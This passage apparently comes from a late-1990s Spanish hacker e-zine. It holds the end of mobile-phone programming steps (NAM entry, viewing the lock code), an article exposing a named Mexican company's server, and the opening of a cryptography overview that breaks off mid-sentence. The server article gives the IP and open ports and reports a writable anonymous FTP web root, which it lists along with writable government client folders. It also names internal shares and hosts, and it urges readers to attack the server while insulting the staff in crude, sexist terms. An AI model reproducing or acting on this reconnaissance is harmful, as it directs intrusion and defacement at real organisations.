     09                                            *                                           033					*
     10                                            *                                           010100					*	
     11                                            *                                           11110					*
 PARA FINALIZAR SND

 Para grabar el segundo NAM en el paso 10 precione Snd y aparece en la
 pantalla (01 2) la programacion del segundo nam
 Para cambiar la nam precione RCL #sto
 Para ver el candado de algunos modelos precione FNC 000000 RCL
 bandas:rcl,* asta encontrar(Scan A) y grabar sto dejar rcl y #


 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
            
                          Dinero tirado a la basura
                                  por Vlad

 Hola hermosa criatura de la creacion ( ups...me estan afectando esas
 platicas de amor al projimo ). Mejor  dicho Hola RaZa , el otro  dia
 webeando por la red me encontre con un server muy interesante:

 GCC (Grupo Corporativo de Consultoria o una madre asi) es una empresa de
 IBM, GCC se dedica a un chingo de madres, pero entre las mas importantes
 es dar soporte a  usuarios Genexus ( una herramienta CASE que por ahi se
 dice que esta poca madre ) , realizacion de proyectos chonchos, dise~o y
 hospedaje de  hojas web  entre otras . Bueno ya conoces a  GCC a grandes
 rasgos y ahora vallamos al grano y a lo que nos interesa

         Direccion    http://www.gcc.com.mx
         ip           200.23.233.5
                      server1.gcc.com.mx
         algunos      SMTP
         puerto       HTTP
         abiertos     POP3
         importantes  NNTP
                      FTP

 server1.gcc.com.mx es el encargado de algunos dominios interesantes como
 son el del  mismo GCC y el de a lgunos de instituciones  gubernamentales
 (.GOB.MX) . Ahora  bien , el puerto 21 ( FTP ) permite  accesos anonimos,
 bueno, muchos  servidores hacen  lo mismo, pero  lo que si es extra~o es
 que da permisos de escritura.

 No creas que hay gran cosa en ese server, algunas madres de uso interno
 de GCC y pendejadas, pero si solicitas cambiar de directorio a 'wwwroot'
 te deja hacerlo sin ningun problema, y que es lo que hay ahi????

 Directorio /wwwroot de FTP en 200.23.233.5

 ------------------------------------------------------------------------

 Bienvenidos al FTP Site de GCC.

 ------------------------------------------------------------------------
 Subir al directorio de nivel superior

 01/01/80 12:00p.m.            368 #haccess.ctl
 02/13/98 10:42a.m.     Directorio _private
 06/05/95 08:26p.m.          6,656 _SETUP.DLL
 07/12/95 05:09p.m.         23,831 _SETUP.LIB
 04/28/99 03:49p.m.     Directorio _vti_bin
 04/28/99 03:49p.m.     Directorio _vti_cnf
 02/13/98 10:31a.m.          1,864 _vti_inf.html
 02/13/98 10:42a.m.     Directorio _vti_log
 04/28/99 03:50p.m.     Directorio _vti_pvt
 02/13/98 10:42a.m.     Directorio _vti_txt
 04/27/99 09:00p.m.         18,071 1calendar.gif
 10/01/96 06:40p.m.          5,537 8x6h.jpg
 10/20/98 07:26p.m.     Directorio aaa
 08/04/99 11:03p.m.     Directorio ACE
 07/21/99 05:11p.m.     Directorio Ado
 04/30/99 09:12p.m.     Directorio AdvWorks
 05/04/98 06:32p.m.     Directorio agraph
 04/27/99 09:00p.m.         19,969 Aif.ocf
 01/01/80 12:00p.m.     Directorio Aldo
 04/27/99 09:00p.m.          1,211 AN_CuadroCH.gif
 04/27/99 09:00p.m.        112,617 AN_euroBaaN.gif
 04/27/99 09:00p.m.         79,763 AN_GCC1.gif
 04/08/99 05:20p.m.          1,262 AN_GCC1A.X3D
 04/08/99 05:20p.m.        191,054 AN_GCC2.gif
 04/08/99 05:20p.m.        101,685 AN_GCCspin.gif
 04/27/99 09:00p.m.          1,120 AN_Regreso.gif
 04/27/99 09:00p.m.         24,684 AN_Temporal.gif
 04/27/99 09:00p.m.          1,264 APLT _IBM
 04/08/99 05:20p.m.          4,995 Aplt_1
 04/08/99 05:20p.m.          5,040 Aplt_2
 04/27/99 09:00p.m.          1,284 APLT_BaaN2
 04/27/99 09:00p.m.          1,284 APLT_BaaN3
 04/27/99 09:00p.m.          1,284 APLT_BaaN4
 04/27/99 09:00p.m.          1,313 APLT_BaaN5
 04/27/99 09:00p.m.            873 APLT_IBM
 04/27/99 09:00p.m.          2,533 APLT_Mapa
 04/27/99 09:00p.m.          1,314 APLT_Regreso1
 04/27/99 09:00p.m.          9,646 APLT_Tablero
 04/27/99 09:00p.m.          1,254 APLT_Temporal
 04/08/99 05:20p.m.          5,040 apptag1
 04/08/99 05:20p.m.          5,040 apptag2
 04/27/99 09:00p.m.          1,286 B_baan1
 04/27/99 09:00p.m.          1,759 B_Costarica.gif
 04/27/99 09:00p.m.          1,069 B_cuadro A.GIF
 04/27/99 09:00p.m.            741 B_cuadro.gif
 04/08/99 05:20p.m.            766 B_CUADRO1.GIF
 04/08/99 05:20p.m.            697 B_CUADRO1A.GIF
 04/27/99 09:00p.m.          1,624 B_CuadroChico.GIF
 04/27/99 09:00p.m.          1,679 B_CuadroChico2.GIF
 04/27/99 09:00p.m.          1,042 B_DF.gif
 04/27/99 09:00p.m.          2,089 B_GCC0.GIF
 04/27/99 09:00p.m.          2,091 B_gcc0A.GIF
 04/08/99 05:20p.m.          2,393 B_GCC1.gif
 04/08/99 05:20p.m.          1,331 B_GCC1A.GIF
 04/27/99 09:00p.m.          2,087 B_GCC2.GIF
 04/27/99 09:00p.m.          2,120 B_gcc2A.GIF
 04/08/99 05:20p.m.          1,331 B_gcc2B.GIF
 04/27/99 09:00p.m.          2,056 B_gcc3.GIF
 04/27/99 09:00p.m.          2,066 B_gcc3A.GIF
 04/27/99 09:00p.m.          1,997 B_gcc4.GIF
 04/27/99 09:00p.m.          2,037 B_gcc4A.GIF
 04/27/99 09:00p.m.          3,467 B_Hermosillo.gif
 04/27/99 09:00p.m.          2,687 B_Ibm.GIF
 04/27/99 09:00p.m.          2,859 B_Ibm2.GIF
 04/27/99 09:00p.m.          1,436 B_Leon.gif
 04/27/99 09:00p.m.          1,796 B_LOGO.GIF
 04/27/99 09:00p.m.          2,137 B_Monterrey.gif
 04/27/99 09:00p.m.          1,513 B_Regreso.GIF
 04/27/99 09:00p.m.          1,552 B_Regreso2.GIF
 04/27/99 09:00p.m.          1,517 B_RegresoGCC.GIF
 04/27/99 09:00p.m.          1,543 B_RegresoGCC2.GIF
 04/08/99 05:20p.m.          2,422 B_TRES.GIF
 04/08/99 05:20p.m.          2,367 B_tresA.gif
 04/27/99 09:00p.m.          1,482 B_tresOK.GIF
 04/27/99 09:00p.m.          1,901 B_tresOKA.GIF
 04/27/99 09:01p.m.         65,252 Baan_1.GIF
 04/27/99 09:00p.m.         23,217 BaaN1.htm
 04/27/99 09:00p.m.         14,264 BaaN10.htm
 04/27/99 09:00p.m.         15,002 BaaN11.htm
 04/27/99 09:00p.m.            534 BaaN12.htm
 04/27/99 09:00p.m.         10,836 BaaN2.htm
 04/27/99 09:00p.m.          9,226 BaaN3.htm
 04/27/99 09:00p.m.         29,788 BaaN4.htm
 04/27/99 09:00p.m.         15,844 BaaN5.htm
 04/27/99 09:00p.m.         15,129 BaaN6.htm
 04/27/99 09:00p.m.         15,701 BaaN7.htm
 04/27/99 09:00p.m.         16,525 BaaN8.htm
 04/27/99 09:00p.m.         15,133 BaaN9.htm
 01/06/97 01:51p.m.          2,418 barrier.gif
 01/01/80 12:00p.m.          9,558 BUSSTAT.EXE
 07/21/99 05:13p.m.     Directorio Caja
 08/04/99 11:04p.m.     Directorio Calgon
 02/13/98 10:43a.m.     Directorio cgi-bin
 07/01/99 02:32p.m.     Directorio cgp
 08/04/99 11:04p.m.     Directorio chaman
 01/01/80 12:00p.m.            623 chaman.htm
 01/01/80 12:00p.m.     Directorio clientes
 08/18/95 04:28p.m.          6,653 COMDUMP.EXE
 04/27/99 09:01p.m.            932 COMPKEY.CLA
 04/27/99 09:01p.m.            930 compkey.class
 02/11/98 08:07p.m.     Directorio consultas
 05/27/98 11:23a.m.            623 contadores.htm
 07/01/99 02:34p.m.     Directorio conti
 06/19/98 05:16p.m.     Directorio Copy of HomePage GCC
 08/09/98 02:42p.m.     Directorio Copy of newPage
 11/06/96 04:46p.m.            387 count8g.gif
 08/04/99 11:05p.m.     Directorio DBdemo
 07/16/98 12:12p.m.          4,740 default.asp
 01/30/97 04:27p.m.          3,135 default.htm
 10/20/97 07:12p.m.          1,275 demos-internet.htm
 01/01/80 12:00p.m.              3 DISK1.ID
 02/12/98 07:03p.m.     Directorio Documentos Relacionados
 08/04/99 11:05p.m.     Directorio Easy
 03/29/99 03:21a.m.         12,754 ed00223_.cil
 02/17/98 01:26p.m.          1,310 encabezado.htm
 04/27/99 09:01p.m.            377 Entrada.htm
 11/09/96 04:57p.m.            548 envgnx.htm
 11/09/96 04:57p.m.            550 envmaco.htm
 04/27/99 09:01p.m.          9,394 eventos.htm
 04/08/99 05:20p.m.          7,142 F_1.gif
 04/08/99 05:20p.m.         29,630 F_2.gif
 04/08/99 05:20p.m.         27,715 F_3.gif
 04/08/99 05:20p.m.         21,328 F_3a.gif
 04/08/99 05:20p.m.         21,571 F_3b.gif
 04/08/99 05:20p.m.         12,092 F_3c.GIF
 04/08/99 05:20p.m.          1,052 F_4.GIF
 04/27/99 09:01p.m.          3,590 F_Estrellas.GIF
 04/27/99 09:01p.m.          3,227 F_Estrellas2.GIF
 04/27/99 09:01p.m.          1,279 F_pags.GIF
 04/08/99 05:20p.m.          1,625 F_PAGS1.gif
 04/27/99 09:01p.m.          1,625 F_PAGS2.gif
 04/27/99 09:01p.m.            650 F_PAGS3.gif
 04/08/99 05:20p.m.          1,309 F_stars.gif
 04/08/99 05:20p.m.         38,882 F_stars2.gif
 04/08/99 05:20p.m.            793 F_Tablero1.gif
 04/08/99 05:20p.m.         20,977 F_Tablero2.GIF
 04/08/99 05:20p.m.         26,567 F_Tablero3.GIF
 04/27/99 09:01p.m.         61,973 F_TableroOK.GIF
 12/13/98 08:15p.m.     Directorio foxodbc
 05/18/98 06:15p.m.          6,805 frconte2.htm
 05/18/98 06:14p.m.          7,022 frconten.htm
 07/01/99 02:35p.m.     Directorio frontpage
 04/27/99 09:01p.m.            842 GCC_00.htm
 04/27/99 09:01p.m.         12,814 GCC_ABRIL.htm
 04/27/99 09:01p.m.         11,381 GCC_Centro.htm
 04/08/99 05:20p.m.            432 GCC_Der.htm
 04/27/99 09:01p.m.          3,916 GCC_doc1.htm
 04/27/99 09:01p.m.          3,855 GCC_doc10.htm
 04/27/99 09:01p.m.          3,895 GCC_doc11.htm
 04/27/99 09:01p.m.          3,937 GCC_doc12.htm
 04/27/99 09:01p.m.          4,288 GCC_doc13.htm
 04/27/99 09:01p.m.          3,890 GCC_doc14.htm
 04/27/99 09:01p.m.          4,196 GCC_doc15.htm
 04/27/99 09:01p.m.          5,911 GCC_doc16.htm
 04/27/99 09:01p.m.          3,693 GCC_doc2.htm
 04/27/99 09:01p.m.         20,831 GCC_doc3.htm
 04/27/99 09:01p.m.          5,664 GCC_doc4.htm
 04/27/99 09:01p.m.          7,925 GCC_doc5.htm
 04/27/99 09:01p.m.          5,083 GCC_doc6.htm
 04/27/99 09:01p.m.          4,160 GCC_doc7.htm
 04/27/99 09:01p.m.          3,866 GCC_doc8.htm
 04/27/99 09:01p.m.          4,404 GCC_doc9.htm
 04/27/99 09:01p.m.          1,114 GCC_Izq.htm
 04/27/99 09:01p.m.         13,020 GCC_JUNIO.htm
 04/27/99 09:01p.m.         12,305 GCC_MAYO.htm
 04/27/99 09:01p.m.         12,015 GCC_Temporal.htm
 04/27/99 09:01p.m.         12,347 GCC_Temporal2.htm
 04/27/99 09:01p.m.          1,607 GCC_Top.htm
 11/21/96 10:28a.m.            677 gccimg.htm
 09/01/96 09:18p.m.          9,581 GCCMOVX.GIF
 12/03/96 08:02p.m.            537 gccwrl.htm
 08/04/99 11:08p.m.     Directorio GE-lineablanca
 02/10/98 06:21p.m.          2,361 gente.htm
 04/28/99 03:06p.m.          3,455 global2.asa
 04/11/97 06:27p.m.          1,228 glosario.htm
 08/04/99 11:09p.m.     Directorio helados
 03/29/99 04:42a.m.     Directorio HomePage GCC
 04/27/99 09:01p.m.         12,559 HSCROLL.CLA
 04/27/99 09:01p.m.         12,559 hscroll.class
 10/04/96 11:13a.m.          9,132 ie_anima.gif
 10/04/96 11:13a.m.          9,132 ie_animated.gif
 08/04/99 11:11p.m.     Directorio Iem
 04/27/99 09:01p.m.          1,004 IM _ DF.gif
 04/27/99 09:01p.m.          2,242 IM_2000.gif
 04/27/99 09:01p.m.            997 IM_Acerca de.gif
 04/27/99 09:01p.m.         33,183 IM_Auditoria1.gif
 04/27/99 09:01p.m.        259,421 IM_Baan_1.GIF
 04/27/99 09:01p.m.         22,629 IM_BaaN11.GIF
 04/27/99 09:01p.m.          1,312 IM_BaaN2.gif
 04/27/99 09:01p.m.         40,466 IM_BaaN3.gif
 04/27/99 09:01p.m.         21,888 IM_BaaN4.GIF
 04/27/99 09:01p.m.         24,444 IM_BaaN5.GIF
 04/27/99 09:01p.m.         25,304 IM_BaaNTira1.GIF
 04/27/99 09:01p.m.         26,010 IM_BaaNTira2.GIF
 04/27/99 09:01p.m.         24,444 IM_BaaNTira3.GIF
 04/27/99 09:01p.m.         21,888 IM_BaaNTira4.GIF
 04/27/99 09:01p.m.         22,819 IM_BaaNTira5.GIF
 04/27/99 09:01p.m.         25,992 IM_BaaNTira6.GIF
 04/27/99 09:01p.m.          1,034 IM_bullet.GIF
 04/27/99 09:01p.m.         37,666 IM_businessInt1.gif
 04/27/99 09:01p.m.          1,574 IM_Costrica.gif
 04/27/99 09:01p.m.         36,697 IM_DAplicaciones1.gif
 04/27/99 09:01p.m.         36,519 IM_ebusiness1.gif
 04/27/99 09:01p.m.          1,473 IM_estrellas1.gif
 04/27/99 09:01p.m.          4,075 IM_estrellas2.GIF
 04/27/99 09:01p.m.          2,856 IM_Hermsillo.GIF
 04/27/99 09:01p.m.          1,337 IM_Leon.gif
 04/27/99 09:01p.m.         36,905 IM_Mapa.GIF
 04/27/99 09:01p.m.          4,695 IM_Meta4_1.gif
 04/27/99 09:01p.m.          8,041 IM_Meta4_2.gif
 04/27/99 09:01p.m.          1,682 IM_Meta4_3.gif
 04/27/99 09:01p.m.          1,649 IM_Meta4_4.gif
 04/27/99 09:01p.m.          1,598 IM_Meta4_5.gif
 04/27/99 09:01p.m.         20,882 IM_Meta4_6.GIF
 04/27/99 09:01p.m.          1,918 IM_Monterry.gif
 04/27/99 09:01p.m.          5,864 IM_Mundo.gif
 04/27/99 09:01p.m.          4,764 IM_Mundo2.gif
 04/27/99 09:01p.m.         34,220 IM_MVerticales1.gif
 04/27/99 09:01p.m.         28,358 IM_Outsourcing1.GIF
 04/27/99 09:01p.m.            930 IM_PeopleS1.gif
 04/27/99 09:01p.m.          6,506 IM_PeopleS2.gif
 04/27/99 09:01p.m.          4,899 IM_PeopleS3.gif
 04/27/99 09:01p.m.          5,573 IM_PeopleS4.gif
 04/27/99 09:01p.m.          4,371 IM_PeopleS5.gif
 04/27/99 09:01p.m.          5,627 IM_PeopleS6.gif
 04/27/99 09:01p.m.         23,110 IM_Portada1.GIF
 04/27/99 09:01p.m.         26,867 IM_ServiciosS1.GIF
 04/27/99 09:01p.m.         21,311 Image8.gif
 02/17/98 01:25p.m.     Directorio images
 04/27/99 09:01p.m.         17,714 ime.class
 05/15/99 12:17p.m.         12,238 img_007.jpg
 05/03/99 07:36p.m.          1,618 index.htm.bak
 01/01/80 12:00p.m.          3,317 index.old
 02/18/98 02:04p.m.          2,994 inicio.htm
 04/27/99 09:01p.m.         17,712 inm.class
 12/13/98 08:13p.m.     Directorio intranet
 04/27/99 09:01p.m.         11,091 ism.class
 04/08/99 05:20p.m.            381 izq.htm
 04/27/99 09:01p.m.          2,047 KEY.HTM
 08/04/99 11:11p.m.     Directorio KPG
 04/27/99 09:01p.m.         18,645 L_GCC1.gif
 04/27/99 09:01p.m.         28,041 L_GCC2.GIF
 04/27/99 09:01p.m.          9,072 L_GCCsuaje.GIF
 04/27/99 09:01p.m.          4,344 L_GCCsuaje2.GIF
 04/27/99 09:01p.m.          3,440 L_GCCsuaje3.GIF
 04/27/99 09:01p.m.          1,861 L_GCCsuaje4.GIF
 04/27/99 09:01p.m.         14,843 L_GCCtxt.gif
 04/27/99 09:01p.m.          2,788 L_Ibm.GIF
 08/04/99 11:13p.m.     Directorio Laredo
 12/03/96 11:39a.m.          2,683 lcdgts_a.gif
 04/08/99 05:20p.m.            226 liga1.htm
 08/30/97 03:25p.m.     Directorio LIVE
 10/20/97 07:12p.m.          2,089 Logo_c.GIF
 11/05/96 10:17a.m.         58,855 logogcc.gif
 11/12/96 04:08p.m.         31,525 logogcc2.jpg
 01/01/80 12:00p.m.          1,111 logo-ie.gif
 08/04/99 11:13p.m.     Directorio Mabe
 08/04/99 11:14p.m.     Directorio MabeMarca
 08/04/99 11:15p.m.     Directorio Mabemotores
 07/01/99 02:36p.m.     Directorio Mazon
 02/17/98 08:23p.m.          7,648 menu.htm
 04/27/99 09:01p.m.         16,225 Meta4_1.htm
 04/27/99 09:01p.m.         17,782 Meta4_2.htm
 04/27/99 09:01p.m.         20,591 Meta4_3.htm
 08/04/99 11:15p.m.     Directorio mexico
 08/04/99 11:15p.m.     Directorio monte
 01/18/99 11:02a.m.     Directorio monte2
 07/12/97 02:05p.m.         14,687 msbo_iis.gif
 08/30/97 05:42p.m.     Directorio multimedia
 11/27/96 10:02a.m.            428 mundoimg.htm
 10/29/96 01:44p.m.         35,588 mundolog.jpg
 12/03/96 07:59p.m.            306 mundowrl.htm
 02/11/98 10:40a.m.          9,146 negocios.htm
 10/29/96 02:06p.m.         25,325 netscape.gif
 08/30/99 10:00a.m.     Directorio newPage
 01/01/80 12:00p.m.          3,361 no.gif
 08/30/97 05:42p.m.     Directorio NTAdmin
 06/03/93 09:55a.m.            326 NULL.CUR
 04/27/99 09:01p.m.          1,026 occcolor.class
 04/27/99 09:01p.m.            726 occcord.class
 04/27/99 09:01p.m.          1,012 ocfontc.class
 04/27/99 09:01p.m.          1,164 ocgifix.class
 04/27/99 09:01p.m.            925 ocjwkey.class
 04/27/99 09:01p.m.          1,462 OCLOGOS.GIF
 04/27/99 09:01p.m.         12,101 OCVSCROL.CLA
 04/27/99 09:01p.m.         12,101 Ocvscrol.class
 04/27/99 03:49p.m.          9,464 OCVscroll.class
 04/28/99 03:03p.m.     Directorio OfficeDepot
 02/18/98 01:01p.m.          3,150 oficinas.htm
 02/09/98 01:47p.m.     Directorio pcmagazine
 04/27/99 09:01p.m.         16,832 PeopleSoft_1.htm
 04/27/99 09:01p.m.         14,146 PeopleSoft_2.htm
 04/27/99 09:01p.m.         14,771 PeopleSoft_3.htm
 04/27/99 09:01p.m.         14,830 PeopleSoft_4.htm
 04/27/99 09:01p.m.         14,167 PeopleSoft_5.htm
 04/27/99 09:01p.m.         14,471 PeopleSoft_6.htm
 08/30/97 05:42p.m.     Directorio plm
 09/04/97 07:31p.m.     Directorio plug-ins
 04/08/99 05:20p.m.          4,941 pruebas.htm
 04/27/99 09:01p.m.          2,666 RECEIPT.HTM
 10/28/98 10:31p.m.     Directorio rh
 08/04/99 11:17p.m.     Directorio sac
 08/30/97 03:25p.m.     Directorio SAMPLES
 09/01/99 02:00a.m.     Directorio sancela
 02/14/96 05:02p.m.         14,592 SAWDUMP.EXE
 12/13/98 09:02p.m.     Directorio SECOFI
 02/11/98 08:08p.m.     Directorio secofi5
 02/10/98 05:48p.m.          3,219 servicios.htm
 08/04/99 11:20p.m.     Directorio Serviplus
 07/11/95 09:50a.m.        393,216 SETUP.EXE
 03/29/99 06:08p.m.     Directorio SevillaPalace
 01/01/80 12:00p.m.          3,371 si.gif
 11/25/97 08:39p.m.     Directorio sitemap
 10/19/98 05:24p.m.     Directorio sProyectos
 04/01/98 01:20p.m.     Directorio ssa
 08/04/99 11:23p.m.     Directorio stc
 08/30/97 05:42p.m.     Directorio tablas
 02/06/97 07:02p.m.          3,135 tempindex.htm
 01/01/80 12:00p.m.     Directorio tempo
 04/27/99 09:01p.m.         49,152 TEXTO GCC
 04/27/99 09:01p.m.      1,236,480 TEXTO PEOPLESOFT
 08/04/99 11:24p.m.     Directorio ticsa
 11/21/96 10:30a.m.            379 titulo.htm
 02/17/98 01:27p.m.          2,941 toc.htm
 11/26/97 11:46a.m.     Directorio tree
 08/04/99 11:24p.m.     Directorio tresgrandes
 04/27/99 09:01p.m.         10,014 TSILBG.CLA
 04/27/99 09:01p.m.         10,014 tsilbg.class
 08/04/99 11:24p.m.     Directorio virtual
 11/08/96 04:47p.m.         21,496 vrml.gif
 08/30/97 03:26p.m.     Directorio wcount
 04/27/99 09:01p.m.        115,234 WS_FTP.LOG

 ------------------------------------------------------------------------

 Me dio curiosidad y revise algunas carpetas com la de STC que es la del
 metro y la de SAC que es otra del gobierno y lo mejor del caso es que
 puedes renombrar, escribir, borrar, crear, hackear, etc.

 Ups... ke pedo?? me dije a mi mismo, quien es el pendejo que adminstra
 este server??. Como era temprano (4:15AM) decidi ver que mas habia por ahi.

 Disk       \\200.23.233.5\NETLOGON      Logon server share
 Disk       \\200.23.233.5\tablas
 Disk       \\200.23.233.5\discoc
 Disk       \\200.23.233.5\CDROM
 Disk       \\200.23.233.5\Webs
 Disk       \\200.23.233.5\CLIENTS
 Disk       \\200.23.233.5\temp
 Disk       \\200.23.233.5\cubeta ODBC
 Disk       \\200.23.233.5\gbalcazar

 Hay cabron, pues anda compartiendo un buen de cosas. Como ya se me habia
 espantado el sue~o pues me segui para ver que encontraba.

 200.23.233.7 ns021GCC <--- este contiene todo timpo de informacion sobre
                            el personal de GCC y algunos documentos sobre
                            cursos.

 200.23.233.9 svr_proxy<--- pues ya se han de imaginar para que sirve.

 Despues de un rato de reflexinar me pregunte a mi mismo : "mi mismo,
 cuanto ganara este administrador por hacerle al pendejo?" pues yo creo
 que por el tama~o de la empresa y por el estatus unos $30,000.00 mensuales
 mas bono y prestaciones por disque administrar una red y garantizar que la
 informacion este segura (y yo sin chamba que es lo que mas me duele).

 Bueno ahi los dejo para que reflexionen y si deciden hacerle algo a este
 server no olviden enviar besos a las mamis de GCC (que todas estan bien
 pero bien buenotas) y una mentada de madre al pendejo administrador.


 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

                            Criptografia Moderna
                               By alt3kx_H3z

    
  Este artikulo  tiene como proposito repasar algunos de los trabajos 
  que han tenido mayor importancia en el campo  de la kriptografia, y 
  que han prevalecido hasta hoy.  Se divide en criptografia  de llave 
  privada o  sistemas  simetricos y  criptografia de  llave publica o 
  antisimetricos.  Mencionaremos los  ultimos  estandares con  que se 
  trabaja en estos dos  tipos de criptografia y principalmente cuales 
  son las herramientas matematicas que se usan.
             

  Introduccion

  Desde  su  aparicion  del hombre , la  informacion  ha  tenido gran 
  importancia en cualquier actividad, sin duda, cuando esta actividad 
  tiene propositos  muy especiales , como el militar , la informacion 
  crece en importancia. La informacion como elemento indispensable en 
  la comunicacion , se puede clasificar en varios niveles dependiendo 
  su valor, como por ejemplo, existe  informacion confidencial en las 
  actividades militares, en las  actividades comerciales importantes, 
  en las  transacciones  financieras, etc., una  forma de  poder  dar 
  seguridad  a  toda  esta  informacion  es  usar  kriptografia . La 
  kriptografia ha tenido  varias etapas de desarrollo, la primera que 
  podemos  limitar  hasta antes  de la  segunda guerra  mundial usaba 
  tecnicas manuales, la segunda a partir del inicio de la segunda gran 
  guerra  hasta  la  invencion  de  las  computadoras  usaba tecnicas 
  mecanicas, y la tercera que  aprovecha toda la tecnologia que hasta 
  hoy es conocida.  En este articulo repasamos algunos de los ultimos 
  adelantos de  esta tercera etapa de  la criptografia.  El orden que 
  tomamos es el siguiente: 
	    

  1- Hablamos de los sistemas simetricos.
 
  Mas concretamente del estado actual de DES y la convocatoria de su 
  reemplazo  denominado AES ( Advanced Encryption Standar ) , de los 
  requerimientos que se  piden y de algunas propuestas que se han ya 
  aceptado. 
	    
  2- Nos  dedicamos a comentar  acerca de los sistemas  asimetricos,
  concretamente del  estado actual del sistema RSA del PKCS #1 v. 2,
  que  previene los ultimos  ataques que se han  anunciado. Asi como
  tambien comentamos el estado de  los sistemas con curvas elipticas
  que han ganado gran popularidad ultimamente.
         
  3- Brevemente  mencionamos  algunos  otros  sistemas  que  por  su
  creatividad han llamado la atencion de la comunidad kriptografica,
  como es el caso del sistema NTRU. 
            
  En 4 describimos la idea  de otra herramienta criptografica que se
  ha ido desarrollando desde hace tiempo, como lo es la comparticion
  de secretos, y como caso particular mencionamos a la conocida como
  criptografia visual.
            
  Aki iniciamos:
             

  1  Criptografia Simetrica


  La  criptografia  simetrica tambien  conocida como criptografia de 
  llave privada, tiene la  propiedad de  que  encripta y desencripta
  con la misma llave, por lo que tanto el emisor del mensaje como el
  receptor  deben  de compartir  la llave  anteriormente,  de ahi el
  nombre de simetrica. Por otra parte  este tipo  de criptografia es
  de alta  velocidad, es  decir, tanto en  proceso de encriptamiento
  como el de  desencriptamiento  son muy rapidos  en comparacion con
  los  sistemas  asimetricos. Los  sistemas  simetricos  son  usados
  actualmente para encriptar grandes cantidades de informacion, y se
  usan  conjuntamente con los  antisimetricos para el intercambio de
  llaves. En la  ultima etapa de la historia  de la  criptografia al
  sistema simetrico  mas  conocido ha sido el DES  ( Data Encryption
  Standar ) , desarrollado  en los a~os 70 por la IBM, este  tomo la
  calidad de  estandar  despues  que el NIST , National Institute of
  Standards  and Technology , del  Departamento de  Comercio  de los
  Estados Unidos lo designo como tal.  En la ultima reunion ( 1993 )
  que el NIST trata el tema, lo volvieron a ratificar  como estandar
  por 5 a~os mas, es decir,  hasta diciembre de 1998. Antes de tomar
  a  fondo  el  caso  de su  reemplazo,  mencionaremos  un  poco  el
  desarrollo de la criptografia simetrica en el periodo de DES.

  Desde su aparicion  DES tubo muchas  interrogantes  a partir de su 
  dise~o, es un sistema  que toma  como entrada bloques de 64 bits y
  una llave de 54 bits,  usa varias  permutaciones y  quiza el mayor
  misterio en su dise~o se  encuentra en  las S-cajas.  La principal
  propiedad de  las S-cajas  es  que no  son  lineales, es decir, no
  existe una funcion lineal que de  la misma salida que las S-cajas.
  En el curso de  los 80 y parte de los 90  han aparecido obviamente
  otros  sistemas  simetricos  de  bloque ,  que es  el  tipo al que
  pertenece DES , entre los cuales se encuentran  IDEA, FEAL, SAFER,
  RC5, GOES , etc. , algunos de  estos basan su seguridad en S-cajas
  como el DES, y  otros en combinaciones de diferentes funciones que
  hacen  dificil  que   el   resultado   sea  lineal .  Asimismo  el
  criptoanalisis  o tecnicas  para  romper  los  sistemas  han  sido
  desarrolladas, entre las mas poderosas citamos a el criptoanalisis
  lineal y diferencial . Se consideran rotos los sistemas que aunque
  en la practica sea muy real, si en teoria se conoce el camino para
  deducir la llave privada a partir de la informacion interferida. 

  A pesar  de  que hay  varias  opciones  de  sistemas  simetricos y
  algunas han ganado gran respeto,  el campo comercial  fue inundado
  por el  sistema DES y  aunque  existen varias  propuestas  para su
  criptoanalisis  ninguna ha tenido exito.  Otra forma de romper los
  sistemas de este tipo ha sido la fuerza bruta, es decir ir probando
  cada una  de las llaves  posibles  hasta encontrar  la buena, este
  metodo depende solo de la rapidez con que se efectuen los ensayos,
  y es precisamente por el a~o de 1995 que se considera la posibilidad
  real de construir un circuito especial que sea capaz de efectuar el
  trabajo con exito.  Esta  posibilidad hace considerar un nuevo tipo
  de dise~o, el  encriptamiento  multiple , es decir , aplicar varias
  veces el mismo algoritmo  con el fin de agrandar la llave , para el
  caso del DES el  tipo de dise~o  con  mas  exito  fue el de  triple
  encriptamiento, denominado triple-DES. Actualmente se considera que
  una llave es segura a  el ataque de fuerza  bruta si tiene al menos
  una longitud de 90 bits, que obviamente sobrepasa la longitud de la
  llave del simple DES que es de 56. 

  La anterior  observacion ha  provocado que se busquen nuevas formas
  de dise~o  en los  sistemas  de  este  tipo ,  que  por  una  parte
  garanticen altos  niveles de seguridad  y por el otro sean de facil
  implementacion y no escondan  secretos  dificil de deducir.  Es asi
  como el  NIST  cree  necesario  replantear  toda  la tecnologia  en
  algoritmos  de  llave  privada  y  convoca  a  proponer  un sistema
  criptografico de llave privada  que sea  usado  como un estandar en
  los proximos 20-30 a~os.

  La convocatoria  del  NIST  aparece  en septiembre  de  1997, y  en
  diferentes  reuniones dara a  conocer  los resultados  conforme los
  tenga   hasta  mediados  de  1999 .   En   terminos  generales  los
  requerimientos que pide el NIST para el AES son que al menos ofrezca
  las mismas propiedades que triple-DES.

  Como  requerimientos minimos se pide  que el algoritmo sea simetrico 
  de bloques y que opere con minimo las opciones de llaves de 128, 192 
  y  256 bits  y se  aplique  a bloques  de 128  bits.  Ademas  que se
  describan  claras  evidencias  matematicas de  que  el  algoritmo es
  seguro respecto a los ataques conocidos.

  Respecto al requerimiento  de la implementacion  se solicita que sea 
  flexible que puedan ser ampliadas sus caracteristicas e implementado 
  en  diferentes  plataformas, asi como en  procesadores de 8-bits, en 
  ATM  ( Automatic Teller Machine )  ,  en  comunicaciones  de  voz  y
  satelitales etc. ,  ademas que  el algoritmo pueda ser usado en como
  "stream cipher" como MAC (Massage Authentication Code)  como funcion 
  Hash y como ayuda en la generacion de cadenas de bits seudoaleatorios.

  La decision de cual sistema se asumira como AES, dependera mucho del 
